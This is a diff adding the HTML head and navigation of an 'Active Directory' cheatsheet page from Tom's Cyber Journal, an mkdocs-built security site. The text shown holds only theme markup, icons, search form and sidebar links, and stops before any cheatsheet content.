@@ -1,0 +1,3600 @@
+<!DOCTYPE html><html lang="en" class="no-js"><head>
+    
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://tominthebytes.github.io/Cyber-Journal/cheatsheets/active_directory/">
+      
+      
+        <link rel="prev" href="../oscp/">
+      
+      
+        <link rel="next" href="../splunk/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    <meta name="google-site-verification" content="9L8DSoaW3axOK-OvOrQUNdLF1e2hb0H4z9_7tf1mtuE">
+
+    
+      
+        <title>Active Directory - Tom's Cyber Journal</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+  
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+    
+      
+      
+    
+  
+  
+  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M64%20480c-35.3%200-64-28.7-64-64V96c0-35.3%2028.7-64%2064-64h320c35.3%200%2064%2028.7%2064%2064v213.5c0%2017-6.7%2033.3-18.7%2045.3L322.7%20461.3c-12%2012-28.3%2018.7-45.3%2018.7zm325.5-176H296c-13.3%200-24%2010.7-24%2024v93.5z%22/%3E%3C/svg%3E');--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20512H96c-53%200-96-43-96-96V96C0%2043%2043%200%2096%200h304c26.5%200%2048%2021.5%2048%2048v288c0%2020.9-13.4%2038.7-32%2045.3V448c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032zM96%20384c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h256v-64zm32-232c0%2013.3%2010.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24H152c-13.3%200-24%2010.7-24%2024m24%2072c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24z%22/%3E%3C/svg%3E');--md-admonition-icon--info:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%20512a256%20256%200%201%200%200-512%20256%20256%200%201%200%200%20512m-32-352a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m-8%2064h48c13.3%200%2024%2010.7%2024%2024v88h8c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-80c-13.3%200-24-10.7-24-24s10.7-24%2024-24h24v-64h-24c-13.3%200-24-10.7-24-24s10.7-24%2024-24%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M461.2%2018.9C472.7%2024%20480%2035.4%20480%2048v416c0%2012.6-7.3%2024-18.8%2029.1s-24.8%203.2-34.3-5.1l-46.6-40.7c-43.6-38.1-98.7-60.3-156.4-63V480c0%2017.7-14.3%2032-32%2032h-32c-17.7%200-32-14.3-32-32v-96C57.3%20384%200%20326.7%200%20256s57.3-128%20128-128h84.5c61.8-.2%20121.4-22.7%20167.9-63.3L427%2024c9.4-8.3%2022.9-10.2%2034.3-5.1zM224%20320v.2c70.3%202.7%20137.8%2028.5%20192%2073.4V118.3c-54.2%2044.9-121.7%2070.7-192%2073.4z%22/%3E%3C/svg%3E');--md-admonition-icon--success:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M434.8%2070.1c14.3%2010.4%2017.5%2030.4%207.1%2044.7l-256%20352c-5.5%207.6-14%2012.3-23.4%2013.1s-18.5-2.7-25.1-9.3l-128-128c-12.5-12.5-12.5-32.8%200-45.3s32.8-12.5%2045.3%200l101.5%20101.5%20234-321.7c10.4-14.3%2030.4-17.5%2044.7-7.1z%22/%3E%3C/svg%3E');--md-admonition-icon--question:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%20512a256%20256%200%201%200%200-512%20256%20256%200%201%200%200%20512m0-336c-17.7%200-32%2014.3-32%2032%200%2013.3-10.7%2024-24%2024s-24-10.7-24-24c0-44.2%2035.8-80%2080-80s80%2035.8%2080%2080c0%2047.2-36%2067.2-56%2074.5v3.8c0%2013.3-10.7%2024-24%2024s-24-10.7-24-24v-8.1c0-20.5%2014.8-35.2%2030.1-40.2%206.4-2.1%2013.2-5.5%2018.2-10.3%204.3-4.2%207.7-10%207.7-19.6%200-17.7-14.3-32-32-32zm-32%20192a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%200c14.7%200%2028.2%208.1%2035.2%2021l216%20400c6.7%2012.4%206.4%2027.4-.8%2039.5S486.1%20480%20472%20480H40c-14.1%200-27.2-7.4-34.4-19.5s-7.5-27.1-.8-39.5l216-400c7-12.9%2020.5-21%2035.2-21m0%20352a32%2032%200%201%200%200%2064%2032%2032%200%201%200%200-64m0-192c-18.2%200-32.7%2015.5-31.4%2033.7l7.4%20104c.9%2012.5%2011.4%2022.3%2023.9%2022.3%2012.6%200%2023-9.7%2023.9-22.3l7.4-104c1.3-18.2-13.1-33.7-31.4-33.7z%22/%3E%3C/svg%3E');--md-admonition-icon--failure:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20576%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M480-16c6.9%200%2013%204.4%2015.2%2010.9l13.5%2040.4%2040.4%2013.5C555.6%2051%20560%2057.1%20560%2064s-4.4%2013-10.9%2015.2l-40.4%2013.5-13.5%2040.4c-2.2%206.5-8.3%2010.9-15.2%2010.9s-13-4.4-15.2-10.9l-13.5-40.4-40.4-13.5C404.4%2077%20400%2070.9%20400%2064s4.4-13%2010.9-15.2l40.4-13.5%2013.5-40.4C467-11.6%20473.1-16%20480-16M321.4%2097.4c12.5-12.5%2032.8-12.5%2045.3%200l80%2080c12.5%2012.5%2012.5%2032.8%200%2045.3l-10.9%2010.9c7.9%2022%2012.2%2045.7%2012.2%2070.5%200%20114.9-93.1%20208-208%20208S32%20418.9%2032%20304%20125.1%2096%20240%2096c24.7%200%2048.5%204.3%2070.5%2012.3zM144%20304c0-53%2043-96%2096-96%2013.3%200%2024-10.7%2024-24s-10.7-24-24-24c-79.5%200-144%2064.5-144%20144%200%2013.3%2010.7%2024%2024%2024s24-10.7%2024-24%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M416%20427.4c58.5-44%2096-111.6%2096-187.4C512%20107.5%20397.4%200%20256%200S0%20107.5%200%20240c0%2075.8%2037.5%20143.4%2096%20187.4V464c0%2026.5%2021.5%2048%2048%2048h32v-40c0-13.3%2010.7-24%2024-24s24%2010.7%2024%2024v40h64v-40c0-13.3%2010.7-24%2024-24s24%2010.7%2024%2024v40h32c26.5%200%2048-21.5%2048-48zM96%20256a64%2064%200%201%201%20128%200%2064%2064%200%201%201-128%200m256-64a64%2064%200%201%201%200%20128%2064%2064%200%201%201%200-128%22/%3E%3C/svg%3E');--md-admonition-icon--bug:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20640%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M352%200c0-17.7-14.3-32-32-32s-32%2014.3-32%2032v64h-96c-53%200-96%2043-96%2096v224c0%2053%2043%2096%2096%2096h256c53%200%2096-43%2096-96V160c0-53-43-96-96-96h-96zM160%20368c0-13.3%2010.7-24%2024-24h32c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-32c-13.3%200-24-10.7-24-24m120%200c0-13.3%2010.7-24%2024-24h32c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-32c-13.3%200-24-10.7-24-24m120%200c0-13.3%2010.7-24%2024-24h32c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-32c-13.3%200-24-10.7-24-24M224%20176a48%2048%200%201%201%200%2096%2048%2048%200%201%201%200-96m144%2048a48%2048%200%201%201%2096%200%2048%2048%200%201%201-96%200m-304%200c0-17.7-14.3-32-32-32S0%20206.3%200%20224v96c0%2017.7%2014.3%2032%2032%2032s32-14.3%2032-32zm544-32c-17.7%200-32%2014.3-32%2032v96c0%2017.7%2014.3%2032%2032%2032s32-14.3%2032-32v-96c0-17.7-14.3-32-32-32%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M288%200H128c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032v151.5L7.5%20426.3C2.6%20435%200%20444.7%200%20454.7%200%20486.4%2025.6%20512%2057.3%20512h333.4c31.6%200%2057.3-25.6%2057.3-57.3%200-10-2.6-19.8-7.5-28.4L320%20215.5V64c17.7%200%2032-14.3%2032-32S337.7%200%20320%200zm-96%20215.5V64h64v151.5c0%2011.1%202.9%2022.1%208.4%2031.8L306%20320H142l41.6-72.7c5.5-9.7%208.4-20.6%208.4-31.8%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M0%20216C0%20149.7%2053.7%2096%20120%2096h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064H64c-35.3%200-64-28.7-64-64zm256%200c0-66.3%2053.7-120%20120-120h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064h-64c-35.3%200-64-28.7-64-64z%22/%3E%3C/svg%3E');}</style>
+
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  <link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
+            html.glightbox-open { overflow: initial; height: 100%; }
+            .gslide-title { margin-top: 0px; user-select: text; }
+            .gslide-desc { color: #666; user-select: text; }
+            .gslide-image img { background: white; }
+            .gscrollbar-fixer { padding-right: 15px; }
+            .gdesc-inner { font-size: 0.75rem; }
+            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
+            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
+            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
+        </style></head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="amber" data-md-color-accent="amber">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#active-directory" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Tom's Cyber Journal" class="md-header__button md-logo" aria-label="Tom's Cyber Journal" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m13.13 22.19-1.63-3.83c1.57-.58 3.04-1.36 4.4-2.27zM5.64 12.5l-3.83-1.63 6.1-2.77C7 9.46 6.22 10.93 5.64 12.5M21.61 2.39S16.66.269 11 5.93c-2.19 2.19-3.5 4.6-4.35 6.71-.28.75-.09 1.57.46 2.13l2.13 2.12c.55.56 1.37.74 2.12.46A19.1 19.1 0 0 0 18.07 13c5.66-5.66 3.54-10.61 3.54-10.61m-7.07 7.07c-.78-.78-.78-2.05 0-2.83s2.05-.78 2.83 0c.77.78.78 2.05 0 2.83s-2.05.78-2.83 0m-5.66 7.07-1.41-1.41zM6.24 22l3.64-3.64c-.34-.09-.67-.24-.97-.45L4.83 22zM2 22h1.41l4.77-4.76-1.42-1.41L2 20.59zm0-2.83 4.09-4.08c-.21-.3-.36-.62-.45-.97L2 17.76z"></path></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Tom's Cyber Journal
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Active Directory
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required="">
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix="">
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/TomInTheBytes/Cyber-Journal" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../oscp/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Cheatsheets
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../writeups/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Write-ups
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../projects/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Tom's Cyber Journal" class="md-nav__button md-logo" aria-label="Tom's Cyber Journal" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m13.13 22.19-1.63-3.83c1.57-.58 3.04-1.36 4.4-2.27zM5.64 12.5l-3.83-1.63 6.1-2.77C7 9.46 6.22 10.93 5.64 12.5M21.61 2.39S16.66.269 11 5.93c-2.19 2.19-3.5 4.6-4.35 6.71-.28.75-.09 1.57.46 2.13l2.13 2.12c.55.56 1.37.74 2.12.46A19.1 19.1 0 0 0 18.07 13c5.66-5.66 3.54-10.61 3.54-10.61m-7.07 7.07c-.78-.78-.78-2.05 0-2.83s2.05-.78 2.83 0c.77.78.78 2.05 0 2.83s-2.05.78-2.83 0m-5.66 7.07-1.41-1.41zM6.24 22l3.64-3.64c-.34-.09-.67-.24-.97-.45L4.83 22zM2 22h1.41l4.77-4.76-1.42-1.41L2 20.59zm0-2.83 4.09-4.08c-.21-.3-.36-.62-.45-.97L2 17.76z"></path></svg>
+
+    </a>
+    Tom's Cyber Journal
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/TomInTheBytes/Cyber-Journal" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"></path></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix="">
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked="">
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cheatsheets
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cheatsheets
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../oscp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
